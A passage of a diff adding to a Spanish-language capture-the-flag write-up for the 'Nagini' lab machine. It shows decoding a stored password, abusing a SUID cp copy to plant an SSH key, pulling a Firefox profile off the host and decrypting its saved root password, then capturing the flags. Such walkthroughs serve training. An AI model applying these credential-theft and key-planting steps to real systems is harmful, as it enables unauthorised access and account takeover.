+drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
+drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
+-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
+-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
+-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
+drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
+-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
+drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
+www-data@Nagini:/home/snape$ cat .creds.txt
+TG92ZUBsaWxseQ==
+```
+Encontramos una contraseña y parece que está cifrada en **base64**.
+
+La podemos descifrar con la herramienta **base64**:
+```bash
+echo "TG92ZUBsaWxseQ==" | base64 -d
+Love@lilly
+```
+
+Probemos la contraseña:
+```bash
+www-data@Nagini:/home/snape$ su snape
+Password: 
+snape@Nagini:~$ whoami
+snape
+```
+Somos **snape**.
+
+Si nos vamos al directorio `.ssh`, encontraremos un archivo extraño:
+```bash
+snape@Nagini:~$ cd .ssh
+snape@Nagini:~/.ssh$ ls -la
+total 12
+drwx------ 2 snape snape 4096 Apr  4  2021 .
+drwxr-xr-x 4 snape snape 4096 Apr  4  2021 ..
+-rw-r--r-- 1 snape snape  222 Apr  4  2021 known_hosts
+snape@Nagini:~/.ssh$ cat known_hosts 
+|1|6O2f+BIs32tAUn/XAoxMwmGkhOQ=|+eYpmJXrZWCgk5E8e8Q1ouGikpA= ecdsa-sha2-nistp256.....
+```
+No hay nada más aquí.
+
+Vamos a ver el binario que encontramos antes.
+
+<h2 id="SSH">Ganando Acceso al Usuario Hermoine con Binario cp y Nueva Llave SSH de Usuario snape</h2>
+
+Revisando el **binario SUID** que descubrimos, resulta ser una copia de la herramienta **cp**:
+```bash
+snape@Nagini:/home/hermoine/bin$ ls -la
+total 156
+drwxr-xr-x 3 hermoine hermoine   4096 Nov 15 01:34 .
+drwxr-xr-x 6 hermoine hermoine   4096 Apr  4  2021 ..
+-rwsr-xr-x 1 hermoine hermoine 146880 Apr  4  2021 su_cp
+snape@Nagini:/home/hermoine/bin# ./su_cp 
+./su_cp: missing file operand
+Try './su_cp --help' for more information.
+```
+
+Como podemos copiar archivos con esta herramienta, una opción a hacer es copiar una nueva llave de **SSH** dentro del directorio **.ssh** del **usuario hermoine**.
+
+Esto lo podemos hacer dentro del **usuario snape** con la herramienta **ssh-keygen**:
+```bash
+snape@Nagini:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/snape/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/snape/.ssh/id_rsa.
+Your public key has been saved in /home/snape/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:qHsmRsgWBERodaBTu1wUYFw8C6lZZe4unC1b3+P7FUg snape@Nagini
+The key's randomart image is:
++---[RSA 2048]----+
+|=+o*BB.          |
+|..==*o           |
+|.++..oo    E     |
+| o+ +. .  . .    |
+| . = .. S  . .   |
+|  = =.        .  |
+| . *.+       .   |
+|    B.+ ..  .    |
+|   o.+ ..++.     |
++----[SHA256]-----+
+snape@Nagini:~$ ls -la .ssh
+total 20
+drwx------ 2 snape snape 4096 Nov 15 01:54 .
+drwxr-xr-x 4 snape snape 4096 Apr  4  2021 ..
+-rw------- 1 snape snape 1876 Nov 15 01:54 id_rsa
+-rw-r--r-- 1 snape snape  394 Nov 15 01:54 id_rsa.pub
+-rw-r--r-- 1 snape snape  222 Apr  4  2021 known_hosts
+```
+Ya está creada.
+
+Ahora copiamos la llave pública en un archivo temporal que llamaremos **authorized_keys** en el **directorio tmp**. Le asignaremos los permisos correctos para que funcione la llave pública (640) y la copiaremos dentro del **directorio .ssh** del **usuario hermoine**:
+```bash
+snape@Nagini:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
+snape@Nagini:~$ chmod 640 /tmp/authorized_keys 
+snape@Nagini:~$ cd /home/hermoine/bin
+snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys ../.ssh/authorized_keys
+```
+Con esto ya debería estar listo nuestro acceso.
+
+Probemos a intentar autenticarnos al **servicio SSH** con el **usuario hermoine**:
+```bash
+snape@Nagini:/home/hermoine/bin$ ssh hermoine@localhost
+Enter passphrase for key '/home/snape/.ssh/id_rsa': 
+Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Apr  4 16:43:01 2021 from ::1
+hermoine@Nagini:~$ whoami
+hermoine
+```
+Listo, ya somos el **usuario hermoine**.
+
+Podemos ver el segundo horocrux:
+```bash
+hermoine@Nagini:~$ ls -la
+total 28
+drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
+drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
+drwxr-xr-x 3 hermoine hermoine 4096 Nov 15 01:34 bin
+drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
+-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
+drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
+drwxr-xr-x 2 hermoine hermoine 4096 Nov 15 01:59 .ssh
+hermoine@Nagini:~$ cat horcrux2.txt 
+horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
+```
+Busquemos cómo escalar privilegios a **Root**.
+
+<h2 id="Mozilla">Crackeando Contraseña de Almacenada de Moziila para ser Root</h2>
+
+Dentro del directorio `/.mozilla/firefox/g2mhbq0o.default`, podemos encontrar todos los archivos de **Mozilla FireFox**:
+```bash
+hermoine@Nagini:~/.mozilla$ ls -la firefox/g2mhbq0o.default/
+total 13092
+drwx------ 14 hermoine hermoine    4096 Apr  4  2021 .
+drwx------  5 hermoine hermoine    4096 Jun  1  2019 ..
+-rw-r--r--  1 hermoine hermoine    1923 Apr  4  2021 addons.json
+-rw-------  1 hermoine hermoine    3560 Apr  4  2021 addonStartup.json.lz4
+-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 AlternateServices.txt
+-rw-------  1 hermoine hermoine  338425 Sep 11  2019 blocklist.xml
+drwx------  2 hermoine hermoine    4096 Dec 20  2020 bookmarkbackups
+-rw-------  1 hermoine hermoine     216 Apr  4  2021 broadcast-listeners.json
+-rw-------  1 hermoine hermoine  294912 Dec 20  2020 cert9.db
+...
+...
+...
+```
+
+Resulta y acontece, que existen 2 archivos que almacenan las contraseñas de los usuarios que guardan sus credenciales en el navegador **FireFox**, estos son:
+* *key4.db*
+* *logins.json*
+
+Esto de acuerdo con lo que nos cuenta **HackTricks**:
+* <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox" target="_blank">HackTricks: Browser Artifacts - FireFox</a>
+
+Y para poder desencriptar esas credenciales, podemos usar dos herramientas **firepwd.py o firefox_decrypt.py**:
+* <a href="https://github.com/unode/firefox_decrypt" target="_blank">Repositorio de unode: firefox_decrypt</a>
+* <a href="https://github.com/lclevy/firepwd" target="_blank">Repositorio de lclevy: firepwd</a>
+
+Vamos a usar ambos para ver qué obtenemos.
+
+<br>
+
+<h3 id="firefoxDecrypt">Utilizando firefox_decrypt.py para Obtener Credenciales Almacenadas de FireFox</h3>
+
+Primero, descarguemos la herramienta:
+```bash
+wget https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
+--2024-11-14 14:38:57--  https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 39405 (38K) [text/plain]
+Saving to: ‘firefox_decrypt.py’
+
+firefox_decrypt.py       100%[==================>]  38.48K  --.-KB/s    in 0.05s   
+
+2024-11-14 14:38:57 (807 KB/s) - ‘firefox_decrypt.py’ saved [39405/39405]
+```
+
+Ahora, necesitamos el **directorio .mozilla**, pero solamente el **usuario hermoine** puede entrar y ver su contenido, así que vamos a modificar sus permisos, para que cualquiera pueda hacer lo mismo:
+```bash
+hermoine@Nagini:~$ chmod -R 755 .mozilla/
+hermoine@Nagini:~$ ls -la .mozilla/
+total 20
+drwsr-xr-x 5 hermoine hermoine 4096 Jun  1  2019 .
+drwxr-xr-x 6 hermoine hermoine 4096 Nov 15 06:52 ..
+drwxr-xr-x 2 hermoine hermoine 4096 Jun  1  2019 extensions
+drwxr-xr-x 5 hermoine hermoine 4096 Jun  1  2019 firefox
+drwxr-xr-x 2 hermoine hermoine 4096 Jun  1  2019 systemextensionsdev
+```
+Listo.
+
+Y con la herramienta **scp**, vamos a copiar ese directorio, usando la cuenta del **usuario snape**:
+```bash
+scp -r snape@192.168.1.006:/home/hermoine/.mozilla .
+snape@192.168.1.006's password: 
+profiles.ini                                    100%  175    47.2KB/s   00:00    
+InstallTime20190517140819                       100%   10     2.9KB/s   00:00    
+InstallTime20190828152820                       100%   10     3.0KB/s   00:00    
+...
+...
+...
+...
+```
+Excelente.
+
+Moveré el **directorio .mozilla** a otro directorio solo para que quede mejor ordenado y luego ejecutamos el **firefox_decrypt.py**, indicando la ruta del directorio `.mozilla/firefox`:
+```bash
+python3 firefox_decrypt.py Firefox_creds/.mozilla/firefox
+
+Website:   http://nagini.hogwarts
+Username: 'root'
+Password: '@Alohomora#123'
+```
+Muy bien, tenemos las credenciales del **Root**.
+
+<br>
+
+<h3 id="firepwd">Utilizando firepwd.py para Crackear Credenciales de logins.json de FireFox</h3>
+
+Descargamos solamente el script:
+```bash
+wget https://raw.githubusercontent.com/lclevy/firepwd/refs/heads/master/firepwd.py
+--2024-11-14 14:42:52--  https://raw.githubusercontent.com/lclevy/firepwd/refs/heads/master/firepwd.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14856 (15K) [text/plain]
+Saving to: ‘firepwd.py’
+
+firepwd.py                      100%[==========================>]  14.51K  --.-KB/s    in 0.01s   
+
+2024-11-14 14:42:53 (1.09 MB/s) - ‘firepwd.py’ saved [14856/14856]
+```
+
+Para esta herramienta, únicamente necesitamos el archivo **logins.json** que se encuentra en el directorio `.mozilla/firefox`. Podemos descargarlo, si como **hermoine o snape** nos posicionamos ahí y levantamos un servidor con **Python**, que sí lo tenemos en la máquina víctima:
+```bash
+hermoine@Nagini:~/.mozilla$ which python3
+/usr/bin/python3
+```
+
+Actívalo y con **wget**, obtén ese archivo:
+```bash
+wget http://192.168.1.006:4433/logins.json
+--2024-11-14 14:44:11--  http://192.168.1.006:4433/logins.json
+Connecting to 192.168.1.006:4433... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 593 [application/json]
+Saving to: ‘logins.json’
+
+logins.json    100%[==================>]     593  --.-KB/s    in 0.001s  
+
+2024-11-14 14:44:11 (729 KB/s) - ‘logins.json’ saved [593/593]
+```
+Bien.
+
+Por último, ubicamos el archivo **logins.json** junto al script y lo ejecutamos:
+```bash
+python3 firepwd.py
+globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
+ SEQUENCE {
+   SEQUENCE {
+...
+...
+...
+...
+...
+ }
+entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
+b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
+decrypting login/password pairs
+http://nagini.hogwarts:b'root',b'@Alohomora#123'
+```
+Al final, volvimos a obtener las credenciales del **Root**.
+
+Ya solo probamos la contraseña que obtuvimos y obtenemos el último horocrux:
+```bash
+ssh root@192.168.1.006
+root@192.168.1.006's password: 
+Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Apr  4 18:01:59 2021
+root@Nagini:~# ls
+horcrux3.txt
+root@Nagini:~# cat horcrux3.txt 
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
 
 
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Medium
+Machine Name: Nagini
+Horcruxes Hidden in this VM: 3 horcruxes
 
+You have successfully pwned Nagini machine.
+Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+```
+Con esto, ya completamos la máquina.
 
 
 <br>
@@ -846,7 +1402,24 @@ Lo que haremos, será cambiar la contraseña del super usuario, para poder entra
 </div>
 
 
-links
+* https://www.webempresa.com/joomla.html
+* https://www.cloudflare.com/es-es/learning/performance/what-is-http3/
+* https://boringssl.googlesource.com/boringssl/
+* https://github.com/cloudflare/quiche
+* https://github.com/curl/curl/blob/master/docs/HTTP3.md
+* https://blog.hackmetrix.com/ssrf-server-side-request-forgery/
+* https://www.getastra.com/blog/security-audit/joomla-penetration-testing/
+* https://github.com/OWASP/joomscan
+* https://tarun05blog.wordpress.com/2018/02/05/ssrf-through-gopher/
+* https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/
+* https://github.com/tarunkant/Gopherus
+* https://github.com/ajnik/joomla-bruteforce
+* https://www.balbooa.com/help/knowledge-base/troubleshooting/reset-joomla-admin-password
+* https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F
+* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce
+* https://github.com/unode/firefox_decrypt
+* https://github.com/lclevy/firepwd
+* https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox
 
 
 <br>
